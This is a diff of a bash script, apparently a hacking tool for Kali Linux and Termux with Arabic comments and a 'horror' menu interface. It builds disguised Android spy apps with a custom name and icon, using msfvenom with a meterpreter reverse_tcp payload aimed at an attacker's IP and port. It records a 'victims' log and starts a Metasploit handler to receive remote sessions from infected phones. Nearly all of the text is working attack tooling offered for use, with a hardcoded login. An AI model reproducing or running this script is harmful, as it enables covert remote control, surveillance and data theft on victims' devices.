@@ -1,15 +1,19 @@
 cat << 'EOF' > xxszmsx.sh
 #!/bin/bash
 # =====================================================
-# TOOL: XXSZMSX (FIXED INTERFACE)
-# COMPATIBILITY: KALI LINUX & TERMUX
+# TOOL: XXSZMSX (FULLSCREEN HORROR EDITION)
+# COMPATIBILITY: TERMUX & KALI LINUX
 # =====================================================
 
-RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; BLUE='\e[1;34m'; NC='\e[0m'
+# تعريف ألوان الرعب
+RED='\e[1;31m'
+BRED='\e[1;31;1m'
+NC='\e[0m'
+
 LOG_FILE=".victims_log.txt"
 DB_FILE=".studio_config"
 
-# --- [ DETECTION: KALI OR TERMUX ] ---
+# تحديد نظام التشغيل ومكان الحفظ
 if [[ -d "/data/data/com.termux/files/usr/bin" ]]; then
     OS="TERMUX"
     SAVE_DIR="/sdcard"
@@ -18,69 +22,76 @@ else
     SAVE_DIR="$HOME/Desktop"
 fi
 
-# --- [ LOGIN INTERFACE ] ---
+# --- [ واجهة تسجيل الدخول ] ---
 clear
-echo -e "${RED}====================================================="
-echo -e "         XXSZMSX SYSTEM - SECURE ACCESS             "
-echo -e "=====================================================${NC}"
-read -p "[+] Username: " username
-read -s -p "[+] Password: " password
-echo ""
+echo -e "${BRED}"
+echo "-----------------------------------------------------"
+echo "        XXSZMSX SYSTEM | SECURE TERMINAL             "
+echo "-----------------------------------------------------${NC}"
+echo -e "${RED}[+] Identity: ${NC}"
+read username
+echo -e "${RED}[+] Key: ${NC}"
+read -s password
 
 if [[ "$username" != "user" || "$password" != "123456789" ]]; then
-    echo -e "${RED}[!] Access Denied! Invalid Credentials.${NC}"
+    echo -e "${BRED}[!] ALERT: ACCESS DENIED!${NC}"
     exit 1
 fi
 
+# --- [ القائمة الرئيسية ] ---
 while true; do
     clear
-    echo -e "${RED}"
-    echo "  __  __  __  __  ____  _____  __  __  ____  __  __ "
-    echo "  \ \/ /  \ \/ / / ___||__  / |  \/  |/ ___| \ \/ / "
-    echo "   \  /    \  /  \___ \  / /  | |\/| |\___ \  \  /  "
-    echo "   /  \    /  \   ___) |/ /_  | |  | | ___) | /  \  "
-    echo "  /_/\_\  /_/\_\ |____//____| |_|  |_||____/ /_/\_\ "
-    echo "                                                     "
-    echo "                [ X X S Z M S X ]                    "
-    echo -e "${YELLOW}-------------------------------------------------------------${NC}"
-    echo -e "  USER: $username          |    OS: $OS"
-    echo -e "-------------------------------------------------------------"
-    echo -e " 1) Build Spy App (Custom Name & Icon)"
-    echo -e " 2) Victims Database (Logs)"
-    echo -e " 3) Start Controller (Metasploit)"
-    echo -e " 0) Exit"
-    echo "-------------------------------------------------------------"
-    read -p "XXSZMSX >> " choice
+    echo -e "${BRED}"
+    # رسمة اسم الأداة بشكل يناسب عرض الشاشة
+    echo "  ██╗  ██╗██╗  ██╗███████╗███████╗███╗   ███╗"
+    echo "  ╚██╗██╔╝╚██╗██╔╝██╔════╝╚══███╔╝████╗ ████║"
+    echo "   ╚███╔╝  ╚███╔╝ ███████╗  ███╔╝ ██╔████╔██║"
+    echo "   ██╔██╗  ██╔██╗ ╚════██║ ███╔╝  ██║╚██╔╝██║"
+    echo "  ██╔╝ ██╗██╔╝ ██╗███████║███████╗██║ ╚═╝ ██║"
+    echo "  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝"
+    echo "          [ X X S Z M S X ] - [ $OS ]         "
+    echo "-----------------------------------------------------"
+    echo -e "  [1] BUILD INFECTED APK (CUSTOM) "
+    echo -e "  [2] VIEW VICTIMS DATABASE       "
+    echo -e "  [3] EXECUTE CONTROL SERVER      "
+    echo -e "  [0] SYSTEM SHUTDOWN             "
+    echo "-----------------------------------------------------"
+    echo -ne "  XXSZMSX >> ${NC}"
+    read choice
 
     case $choice in
         1) 
-           read -p "[+] Enter App Name: " app_name
-           read -p "[+] Enter Icon URL: " icon_url
-           read -p "[+] Enter LHOST (IP): " lh
-           read -p "[+] Enter LPORT (Port): " lp
+           clear
+           echo -e "${BRED}[*] APK GENERATOR MODE${NC}"
+           echo "-----------------------------------"
+           read -p "[+] App Name: " app_name
+           read -p "[+] Icon URL: " icon_url
+           read -p "[+] LHOST IP: " lh
+           read -p "[+] LPORT: " lp
            echo "$lh:$lp" > "$DB_FILE"
-           echo "[$(date +%Y-%m-%d_%H:%M)] App: $app_name | IP: $lh | Port: $lp" >> "$LOG_FILE"
-           echo -e "${YELLOW}[*] Downloading Icon...${NC}"
-           curl -s "$icon_url" -o icon.png
-           echo -e "${YELLOW}[*] Building $app_name.apk...${NC}"
+           echo "[$(date +%H:%M)] App: $app_name | IP: $lh" >> "$LOG_FILE"
+           echo -e "${RED}[*] Injecting...${NC}"
            msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R > "$SAVE_DIR/$app_name.apk"
-           echo -e "${GREEN}[+] Success! Saved to: $SAVE_DIR/$app_name.apk${NC}" ;;
+           echo -e "${BRED}[+] Success! Check $SAVE_DIR${NC}"
+           read -p "Press Enter..." ;;
         2)
            clear
-           echo -e "${BLUE}--- [ VICTIMS LOG ] ---${NC}"
-           [ -f "$LOG_FILE" ] && cat "$LOG_FILE" || echo "No logs found."
-           echo "-----------------------"
-           read -p "Press Enter to return..." ;;
+           echo -e "${BRED}[*] VICTIMS LOGS${NC}"
+           echo "-----------------------------------"
+           [ -f "$LOG_FILE" ] && cat "$LOG_FILE" || echo "Database Empty"
+           echo "-----------------------------------"
+           read -p "Press Enter..." ;;
         3) 
+           clear
            if [ -f "$DB_FILE" ]; then
                IP=$(cut -d: -f1 "$DB_FILE"); PORT=$(cut -d: -f2 "$DB_FILE")
-               echo -e "${GREEN}[*] Initializing Metasploit on $IP:$PORT...${NC}"
+               echo -e "${RED}[*] Starting Server on $IP:$PORT...${NC}"
                msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $PORT; set ExitOnSession false; exploit -j"
            else
-               echo -e "${RED}[!] Error: No config found.${NC}"; sleep 2
+               echo -e "${BRED}[!] Error: No Config found.${NC}"
+               sleep 2
            fi ;;
         0) exit 0 ;;
     esac
-    echo -e "\n${RED}[+] Press Enter to Continue...${NC}"; read
 done
 EOF
